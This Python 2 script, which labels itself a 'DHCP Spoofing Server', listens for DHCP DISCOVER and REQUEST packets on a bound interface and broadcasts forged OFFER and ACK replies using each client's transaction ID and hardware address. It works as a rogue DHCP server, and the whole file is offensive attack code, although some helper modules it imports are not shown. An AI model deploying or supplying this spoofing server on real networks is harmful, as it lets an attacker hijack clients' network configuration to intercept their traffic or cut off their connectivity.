import socket
import info
from utils import *
from optionsProcessor import DHCP_DISCOVER, DHCP_REQUEST, toAddr
import argparse



#================================================
# Reads relevant info from the received packet
def getFields(packet):
	def pick(packet, strt, nbytes):
		tmp = packet[strt:strt+nbytes]
		tmp = [unbytefy(b) for b in tmp]
		return get(tmp,nbytes)

	def pickOpt(packet, strt):
		tmp = []
		for b in packet[strt:]:
			tmp.append(unbytefy(b))
			if b == '\xff':
				break
		return tmp

	fields = {}
	opts = pickOpt(packet, 28+16+192+4)

	fields['xid']    = pick(packet, 4, 4)
	fields['chaddr'] = pick(packet,28, 4*4)
	fields['opts']	 = int(getOpts(opts, focus=53),16)
	
	return fields
#================================================


#================================================
# Instantiates a UDP socket and initiates the server
def echo_server(port):
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
	# 25 here corresponds to SO_BINDTODEVICE, which is not exposed by Python (presumably for portability reasons).
	sock.setsockopt(socket.SOL_SOCKET, 25, info.myInfo()[0])
	sock.bind(('', port))

	print 'Server is on!'

	try:
		while True:
			data, _ = sock.recvfrom(data_payload)

			if data:
				fields = getFields(data)

				comp = lambda : ''
				
				if fields['opts'] == DHCP_DISCOVER:
					response = 'offer'
				
				elif fields['opts'] == DHCP_REQUEST:
					response = 'ack'
					comp	 = lambda : 'to {}'.format(toAddr(manager.last))
				
				else:
					continue
				
				sock.sendto(fill(response, fields['xid'], fields['chaddr']), ('255.255.255.255',68))
				print 'sent', response, comp()
	except KeyboardInterrupt:
		print '\rShutting down...'
#================================================



if __name__ == '__main__':
	parser = argparse.ArgumentParser(description='DHCP Spoofing Server')
	args = parser.parse_args()
	echo_server(DHCP_SERVER_PORT)
